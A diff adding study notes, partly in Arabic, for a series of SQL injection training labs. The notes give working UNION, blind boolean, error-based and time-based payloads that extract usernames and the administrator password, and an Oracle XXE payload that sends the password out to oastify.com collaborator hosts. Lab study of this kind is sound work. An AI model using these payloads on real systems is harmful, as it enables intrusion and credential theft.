@@ -1,0 +1,304 @@
+#sqli -> product category filter 
+
+End goal: determine the number of columns returned by the query 
+
+Background (union)
+
+table 1     table 2 
+A | B       c | d
+-----       ------
+1,2          2,3
+3,4          4,5
+
+query #1   select a,b from table => 1
+1,2
+3,4
+
+query # 2| select a,b from table => 1 UNION select c,d from table 2
+1,2
+3,4
+2,3
+4,5
+
+select a,b from table 1   <==> UNION select uesrnames,passwords from  user 
+
+
+#Rule: The number and the order of the colums must be the same in all queries 
+
+-The date typs must be compatibe 
+
+#sql attack
+
+1>>select ? from table1 => UNION select NULL
+
+error 500 => incorrect number of colums
+
+2>>select ? from table1 => UNION select NULL,NULL
+
+3
+3 >>select ? from table1 => UNION select NULL,NULL,NULL,NULL, =>200
+
+
+
+2<<#sql attack (order by 100)=>>(order by 1)
+
+====================================================================================
+step #2 Determine the data type of the columns
+
+select a,b,c from tables 1 UNION select 'admin', NULL,NULL
+
+->> error column is not type string 
+
+===> no error -> column is of type string 
+================================================================================
+Analysis:
+3 coluns => lst coluns is not show on the page 
+===================================================================================
+1,==== ORDER BY 1--
+=====> 200
+' UNION select NULL,NULL,NULL--
+
+ UNION select 'a',NULL,NULL-- ===> 500
+
+UNION select NULL,'a','a' ===200---500?
+
+UNION select NULL,'a',NULL-- ===> 200
+
+
+====================================================================================
+=======================================================================================================================
+
+#sql injection category filter
+
+End goal output the usernames and passwerd in user table and login as the administrator UserWarning
+
+Analysis
+
+1) Determine of colums that the vulnerable query is using =====> 'ORDER BY 1--
+
+2)Determine the data type of the colums ===> ' UNION select 'a', NULL-- =======>' UNION select 'a', 'A'--
+
+
+
+'+UNION+SELECT+username,+password+FROM+users--
+===========================================
+-NULL UNION select 1,2,user()
+=======================================================================================================================
+========================================================================================================================
+#sql injection category filter
+
+end goal ==> retrieve all usernames and passwerd and login as the adminstrator user 
+
+
+Analysis''''''
+ 
+1) find the number of columns that the vulnerable is using ======>' order by 1--
+
+
+2) find which coluns containg txt ======>>> ' UNION SELECT NULL, NULL--
+
+3) I turn on which of them text string  >>> ' UNION SELECT 'admin','aa'--
+
+
+
+4) output data from other tables    =====1-  '+UNION+SELECT+NULL,username from users--
+
+2=======>   '+UNION+SELECT+NULL,password from users--
+
+'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
+
+=================================================================
+-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()
+================================================================
+
+ +UNION+SELECT+NULL,password from users--
+
+
+==================================================================================================================
+' UNION select NULL, version()--
+
+-NULL UNION select 1,2,version ()#
+
+
+' UNION select NULL, version()
+
+========================================================================================================================
+
+end goal ==>  To solve the lab, display the database version string. 
+
+Analysis''''''
+
+
+1)determine the number of columns ===>' order by 1--
+
+
+2) Determine the data type of the colums ' UNION SELECT NULL,NULL-- ===>2colums OR 3 colums >
+
+' UNION SELECT 'A','S' from DUAL --
+
+3) output the version of the database ===>>  	SELECT banner FROM v$version ====>>. ' UNION SELECT banner,NULL from v$version --
+
+
+==================================================================================================================================
+
+sql in product category filter 
+
+end goal ==>  To solve the lab, display the database version 
+
+
+Analysis''''''
+
+1)the number of columns ===>' order by 1-- ====>>>' order by 1#
+
+2) figere out which columns text ===>>>  ' UNION SELECT 'a','a'#   ///200 or 500
+
+3) output the version of the database ==>.  ' UNION SELECT @@version,NULL# 
+========================================================================================================================
+
+End Goals: Determine the table that contains usernames and passwerd 
+Determine the relevant columns 
+output the content of the table 
+Login as the adminstrator user 
+
+
+Analysis'''''''
+
+1) Find the number of columns ===>> ' order by 100--
+
+2) Find the data type of the coluns --=coluns accept tupe txt  ===> ' UNION select 'A','a'--
+
+3) version of the database ====>> ' UNION select @@version,NULL--==== ' UNION SELECT version(),NULL-- ===
+
+4) Output the list of table names in the database => '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
+ 	SELECT * FROM information_schema.tables 
+
+
+
+
+
+5) output the coluns name of the table ==='+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_mmnmxp'--
+users_mmnmxp
+SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+
+
+6)  output the username and passweds=== ' UNION select username_vjfcwx, password_mhqerg from users_mmnmxp--
+
+username_vjfcwx
+
+password_mhqerg
+========================================================================================================================
+End Goals: Determine the table that contains usernames and passwerd 
+Determine the relevant columns 
+output the content of the table 
+Login as the adminstrator user 
+
+
+Analysis'''''''
+
+1) Find the number of columns ===>> ' order by 2--
+
+2) Find the data type of the coluns --=coluns accept tupe txt  ===> ' UNION SELECT 'a','a' from DUAL--
+
+
+4) Output the list of table names in the database => '+UNION+SELECT+table_name,NULL+FROM+all_tables--
+ 	
+USERS_BRQPSM
+
+USERS_BRQPSM
+
+
+5) output the coluns name of the USERS ==='+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_BRQPSM'--
+
+ SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE' 
+
+
+
+
+6)  output the username and passweds=== '+UNION+SELECT+USERNAME_SDNETK,+PASSWORD_LCDPYF+FROM+USERS_BRQPSM--
+========================================================================================================================
+
+==================================================================================================================================================================
+
+
+1)' AND '1'='1
+
+2)' AND '1'='0
+
+3)' AND (SELECT 'a' FROM users LIMIT 1)='a
+
+4)' AND (SELECT 'a' FROM users WHERE username='administrator')='a
+
+5)' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a 
+
+6) send to Intruder ===> Select numbers from the payload ===> From 1 to 20 step 1 ===>>Open the settings go to Grep-match Click cler and ==>  welcome back
+and  start attack   ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a       اختار a  from payloads click  simple list
+
+=================================================================================================================================================================
+vulnerable parameter - tracking cookie
+
+end goals output the administrator password 
+login as the administrator user 
+
+
+1) prove that parameter is Vulnerabl '(500)  ''(200) 
+
+2) '||(SELECT '')||' if I get Error ممكن يكون بي سبب اني قاعد تعامل مع قاعدت بيانات اخرا فااجرب ===> '||(SELECT '' FROM dual)||' <===> oracle database
+
+3) '||(SELECT '' FROM not-a-real-table)||' اجرب اي تيبل غير موجود بي قاعدت البيانات وازا اعطاني ارر يعني انا متااكد من انه مصاب 
+
+4) confrim that user table exists in the database ==> '||(SELECT '' FROM users WHERE ROWNUM = 1)||'            ==تعين رقم في اركلROWNUM
+
+5) استعلام SQl يشير(500) خطأ بقسمة عدد على صفر ويعيد قيمة فارغة===> '||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'   
+
+6)confrim that the administrator user exists in the user database (500)===>> ' "administrator". '||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+
+7) الان نجرب نحط اسم مو موجود بالداتا بيس ونشوف ازا كان ٢٠٠ الرد يعني انا متاكد انه الاسغلال صح===> '||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='adnistrator')||'
+
+8)  (٥٠٠ صحيح)الان نحاول نشوف كم طول كلمت المرور ==> '||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+
+9)output the adminstrator password ((تخمين)) ===>'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+
+
+10) send to Intruder ===> Select numbers from the payload ===> From 1 to 20 step 1 ===>>Open the settings go to الاول ارقام والثاني برد فورسر احرف   ==> وغر من الاعدادات نوع الهجوم cluster bomb
+and  start attack '||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+
+=========================================================================================================================================
+#Vunerable parameter tracking cookie
+Eed goal: to prove that the filed is vunerable to blind (sql-i) time based
+
+Analysis''''''
+
+||) لدمج جملة خبيثة مع جملة SQL أصلية بطريقة تسمح بتنفيذ الجملة الخبيثة في قاعدة البيانات.
+
+PostgreSQL: ==> '||pg_sleep(10)--
+
+MySQL: ===>>> '||SLEEP(10)--                             
+SELECT pg_sleep(10) 
+
+===================================================================================================================================
+4lqr7gl4l9c34a6ei6au8v5m1d75vu.oastify.com
+
+Ngrok
+
+'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//zps81hcvkttn7l4qg06uekepbgh65v.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
+
+SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
+
+==================================================================================================================================
+
+#Vunerable parameter tracking cookie
+End goales ==> exploit sqli to output the passwerd of the administrator user ==> login as the admin
+
+'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//6v2aof2bl27occ3cbd0j7l7whnndb2.oastify.com/ '||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
+
+' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(fh0jaook7btxylplxmmstut53w9nxc.oastify.com)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual)--
+=========================================================================================================================================================================================
+SQL injection with filter bypass via XML encoding
+
+1)   UNION SELECT NULL
+
+2)we will use Extensione ===> Hackvertor ==> Encode =>hex_entities
+
+
+3) UNION SELECT username || '~' || password FROM users
+
